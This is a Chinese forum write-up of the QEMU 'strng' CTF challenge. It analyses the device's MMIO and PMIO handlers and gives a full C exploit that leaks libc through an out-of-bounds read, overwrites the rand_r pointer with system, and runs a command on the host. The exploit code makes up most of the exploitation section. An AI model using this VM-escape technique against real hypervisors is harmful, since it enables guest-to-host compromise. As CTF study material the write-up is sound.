我们先打开对应的 `/sys/devices/pci0000\:00/0000\:00\:03.0/resource0` ，然后将其以 `MAP_SHARED` 映射。那么我们可以通过操作这一块映射空间来读写操作mmio空间。

接下来只要`addr`越界即可。

```c
void * mmio_mem;

uint64_t mmio_read(uint32_t addr){
    return *( (uint32_t *)mmio_mem + addr );
}

void mmio_write(uint32_t addr,uint64_t val ){
    *((uint32_t *)mmio_mem + addr) = val;
}

int main(){

    int mmio_fd = open("/sys/devices/pci0000\:00/0000\:00\:03.0/resource0",O_RDWR | O_SYNC);
    if(mmio_fd==-1){  perror("mmio failed");exit(-1);  }

    mmio_mem = mmap(0,0x1000,PROT_READ | PROT_WRITE, MAP_SHARED,mmio_fd,0);
    if(mmio_mem == MAP_FAILED){ perror("map mmio failed");exit(-1);}
    printf("addr of mmio:%p\n",mmio_mem);

    getchar();
    mmio_write(260,0x677a7967); // out of bound
    return 0;
}
```

但是实际调试的过程中，我发现根本就写不上去。

*If you are thinking, “oh we have out-of-bound access here because `addr` is not checked anywhere”, you would be wrong. The PCI device internally checks if the `addr` you are trying to access is within the boundaries of the MMIO thus only 256 bytes.*

PCI设备在内部会检查这个地址是否越界，所以这里的任意写其实无法利用。

### strng_pmio_read

```c
uint64_t __fastcall strng_pmio_read(STRNGState *opaque, hwaddr addr, unsigned int size)
{
    uint64_t result; // rax
    uint32_t index; // edx

    result = -1LL;
    if ( size == 4 )
    {
        if ( addr )
        {
            if ( addr == 4 )
            {
                index = opaque->addr;
                if ( (index & 3) == 0 )
                    result = opaque->regs[index >> 2];
            }
        }
        else
        {
            result = opaque->addr;
        }
    }
    return result;
}
```

这里可以看到：

- 当我们传入的`addr=4`时，以 `opaque->addr >> 2` 为索引`index`读取`regs[index]`，并返回
- 当我们传入的`addr`为0时，直接返回 `opaque->addr`

如果我们可以控制 **`opaque->addr`** 那么就相当于控制了下标，可以进行任意读了。

### strng_pmio_write

```c
void __fastcall strng_pmio_write(STRNGState *opaque, hwaddr addr, uint64_t val, unsigned int size)
{
    uint32_t v4; // eax
    __int64 v5; // rax

    if ( size == 4 )
    {
        if ( addr )
        {
            if ( addr == 4 )
            {
                v4 = opaque->addr;
                if ( (v4 & 3) == 0 )
                {
                    v5 = v4 >> 2;
                    if ( v5 == 1 )
                    {
                        opaque->regs[1] = (opaque->rand)(opaque, 4LL, val);
                    }
                    else if ( v5 )
                    {
                        if ( v5 == 3 )
                            opaque->regs[3] = (opaque->rand_r)(&opaque->regs[2], 4LL, val);
                        else
                            opaque->regs[v5] = val; //控制 opaque->addr 后，在这里可以进行任意写
                    }
                    else
                    {
                        opaque->srand(val);
                    }
                }
            }
        }
        else
        {
            opaque->addr = val; //addr==0时，可以配合pmio_read实现任意读
        }
    }
}
```

刚刚的`pmio_read`我们得出结论，如果能控制 `opaque->addr` ，那么就可以做到任意读取。

（1）而在`pmio_write`中 **当`addr`为0时，可以直接控制 `opaque->addr = val`** ，也就是说此时我们的 **任意读** 已经有了。

（2）而当我们能控制 `opaque->addr` 后，相当于我们可以控制`v5`，`v5 = (opaque->addr>>2)`，进而如果`v5`不等于3，可以通过`v5`来做**任意写**

（3）当`v5`等于3时，会对 **`opaque->rand_r`** 产生一个调用，第一个参数为 **`opaque->regs[2]`的地址** ，如果我们将`regs[2]`处的内容写成某个命令。然后任意读`rand_r`地址，计算`libc`，任意写 为`system`，那么就可以实现 **任意命令执行**。

## 漏洞利用

总结一下思路：

```
00000000 STRNGState      struc ; (sizeof=0xC10, align=0x10, copyof_3816)
00000000 pdev            PCIDevice_0 ?
000008F0 mmio            MemoryRegion_0 ?
000009F0 pmio            MemoryRegion_0 ?
00000AF0 addr            dd ?
00000AF4 regs            dd 64 dup(?)
00000BF4                 db ? ; undefined
00000BF5                 db ? ; undefined
00000BF6                 db ? ; undefined
00000BF7                 db ? ; undefined
00000BF8 srand           dq ?                    ; offset
00000C00 rand            dq ?                    ; offset
00000C08 rand_r          dq ?                    ; offset
00000C10 STRNGState      ends
```

（1）首先将字符串 `"gnome-calculator"` 通过`mmio_write`写到`regs[2]`的位置。

（2）通过控制 `opaque->addr = val` 进行任意读取，读`srand`的地址，计算`libc`。

（3）通过任意写改写 `rand_r` 函数的地址为`system`，然后执行 `(opaque->rand_r)(&opaque->regs[2], 4LL, val);` 弹计算器。

## exp

对于pmio，我们使用`<sys/io.h>`中的`outl`，`inl`进行读写。

```c
static __inline unsigned int
inl (unsigned short int __port)
{
  unsigned int _v;

  __asm__ __volatile__ ("inl %w1,%0":"=a" (_v):"Nd" (__port));
  return _v;
}

static __inline void
outl (unsigned int __value, unsigned short int __port)
{
  __asm__ __volatile__ ("outl %0,%w1": :"a" (__value), "Nd" (__port));
}
```

而此时我们的`addr`就相当于读写的端口`port`。

```
0x000000000000c050 0x000000000000c057 0x0000000000040101    （PMIO）
```

如果需要打断点，我们直接 `b strng_pmio_read` 即可

```
pwndbg> print &(* (STRNGState*)$rdi).regs
$5 = (uint32_t (*)[64]) 0x559f77aad294
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <ctype.h>
#include <termios.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/io.h>

size_t pmio_base = 0x000000000000c050;
void * mmio_mem;

uint64_t mmio_read(uint32_t addr){
    return *( (uint32_t *)mmio_mem + addr );
}

void mmio_write(uint32_t addr,uint32_t val ){
    *((uint32_t *)mmio_mem + addr) = val;
}

void pmio_write(uint32_t addr,uint32_t val){
    outl(val,addr);
}

uint64_t pmio_read(uint32_t addr){
    return (uint32_t)inl(addr);
}

int main(){
    setbuf(stdout,0);
    setbuf(stdin,0);
    setbuf(stderr,0);
    int mmio_fd = open("/sys/devices/pci0000\:00/0000\:00\:03.0/resource0",O_RDWR | O_SYNC);
    if(mmio_fd==-1){  perror("mmio failed");exit(-1);  }

    mmio_mem = mmap(0,0x1000,PROT_READ | PROT_WRITE, MAP_SHARED,mmio_fd,0); //mmap mmio space
    if(mmio_mem == MAP_FAILED){ perror("map mmio failed");exit(-1);}
    printf("addr of mmio:%p\n",mmio_mem);

    mmio_write(2,0x6d6f6e67); // regs[2]
    mmio_write(3,0x61632d65); // regs[3]
    mmio_write(4,0x6c75636c); // regs[4]
    mmio_write(5,0x726f7461); // regs[5]
    //mmio_write(24,0x6b637566);

    if(iopl(3)!=0){perror("iopl failed");exit(-1);}

    uint64_t srand_addr;
    uint64_t tmp;
    uint64_t libc;
    uint64_t system;
    /* first time we read high 4 bytes */
    pmio_write(pmio_base+0,0x108);
    srand_addr = pmio_read(pmio_base+4);
    printf("[DEBUG] 0x%llx\n",srand_addr);
    srand_addr = ((srand_addr<<32));
    printf("[*]0x%llx\n",srand_addr);
    /*  Second time we read low 4 bytes */
    pmio_write(pmio_base+0,0x104);
    tmp = (pmio_read(pmio_base+4));
    printf("[*]0x%llx\n",tmp);
    srand_addr += tmp;
    printf("srand_addr:0x%llx\n",srand_addr);
    libc = srand_addr - 0x3a8e0;
    printf("[*]libc_addr:0x%llx\n",libc);
    system = libc + 0x453a0;
    printf("[*]system:0x%llx\n",system);

    /* we just need to overwrite low 4 bytes */
    pmio_write(pmio_base+0,0x114); // set addr
    pmio_write(pmio_base+4,(system & 0xffffffff)); // overwrite rand_r

    /*  trigger system */
    pmio_write(pmio_base+3,0);
    return 0;
}
```

最终效果
 ![](https://bbs.kanxue.com/upload/attach/202101/876323_SYBV33S6DTQAJZE.gif)

# ref

[VM escape - QEMU Case Study](https://bbs.kanxue.com/elink@125K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6i4m8Z5M7X3q4U0K9#2)9J5k6h3!0J5k6#2)9J5c8Y4m8S2M7r3g2J5M7#2)9J5c8Y4k6E0i4K6u0V1k6i4y4U0j5i4m8W2i4K6u0V1M7h3g2E0N6g2)9J5k6r3y4S2M7$3g2Q4x3X3c8K6N6s2g2V1P5g2)9J5k6h3S2@1L8h3H3`.)

[Linux用户空间将虚拟地址转化为物理地址](https://bbs.kanxue.com/elink@2e3K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6J5N6r3!0S2P5q4)9J5k6h3u0D9L8$3N6Q4x3X3g2U0M7$3c8F1i4K6u0W2L8X3g2@1i4K6u0r3j5i4u0@1K9h3y4D9k6g2)9J5c8X3c8W2N6r3q4A6L8s2y4Q4x3V1j5I4x3o6R3&6z5o6x3&6x3o6f1`.)

[浅谈内存映射I/O(MMIO)与端口映射I/O(PMIO)的区别](https://bbs.kanxue.com/elink@b8eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2U0L8X3u0D9L8$3N6K6i4K6u0W2j5$3!0E0i4K6u0r3K9h3c8G2M7X3q4^5i4K6u0r3M7q4)9J5c8U0M7$3z5e0p5K6x3K6c8Q4x3X3g2Z5N6r3#2D9)

[浅谈 Linux 内核开发之 PCI 设备驱动](https://bbs.kanxue.com/elink@263K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2A6j5X3#2Q4x3X3g2U0L8$3#2Q4x3V1k6V1k6i4k6W2L8r3!0H3k6i4u0%4L8%4u0C8M7#2)9J5c8X3y4F1i4K6u0r3L8r3W2F1N6i4S2Q4x3V1k6D9i4K6u0V1j5$3&6Q4x3X3c8H3j5$3W2Q4x3V1k6A6L8X3c8W2P5q4)9J5k6h3S2@1L8h3H3`.)

[QEMU学习笔记——QOM(Qemu Object Model)](https://bbs.kanxue.com/elink@c4eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2T1K9h3&6K6M7#2)9J5k6h3#2W2i4K6u0r3j5X3I4G2k6#2)9J5c8Y4q4W2L8i4g2Q4x3X3c8F1L8%4c8W2i4K6u0V1L8$3k6Q4x3X3c8I4k6h3#2#2i4K6u0V1L8$3u0B7k6h3y4@1i4K6u0V1L8h3!0V1k6h3I4Q4x3V1j5`.)

[QEMU中KVM的初始化调用路径](https://bbs.kanxue.com/elink@8c6K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6B7N6h3g2B7K9h3&6Q4x3X3g2U0L8W2)9J5c8Y4m8G2M7%4c8Q4x3V1j5$3z5o6b7@1z5e0l9K6z5o6b7@1y4o6f1#2z5e0l9%4x3K6x3#2)

[KVM Log 1-QEMU Object Module (QOM)](https://bbs.kanxue.com/elink@a00K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6K9h3I4W2L8Y4c8E0K9h3&6Y4i4K6u0W2L8X3g2@1i4K6u0r3j5X3I4G2k6#2)9J5c8U0t1H3x3e0N6Q4x3V1j5H3z5q4)9J5c8U0p5@1i4K6u0r3K9%4k6E0i4K6u0V1L8r3!0Y4i4K6u0V1x3g2)9J5k6s2q4W2L8i4g2Q4x3X3c8E0L8$3c8#2L8r3g2Q4x3X3c8A6L8Y4c8J5L8#2)9J5c8R3`.`.)

[d02K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6Y4M7X3q4F1k6r3g2E0K9#2)9J5c8Y4q4W2L8i4g2Q4y4h3k6V1k6i4k6A6j5$3g2K6i4K6u0r3j5X3I4G2j5W2)9J5c8X3#2S2M7%4c8W2M7W2)9J5c8X3S2W2L8r3I4G2i4K6g2X3N6r3W2U0i4K6u0W2j5H3`.`.](https://bbs.kanxue.com/elink@db0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6Y4M7X3q4F1k6r3g2E0K9#2)9J5c8Y4q4W2L8i4g2Q4y4h3k6V1k6i4k6A6j5$3g2K6i4K6u0r3j5X3I4G2j5W2)9J5c8X3#2S2M7%4c8W2M7W2)9J5c8X3S2W2L8r3I4G2i4K6g2X3N6r3W2U0i4K6u0W2j5H3`.`.)

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

最后于  2021-1-22 00:19
被Roland\_编辑
，原因：
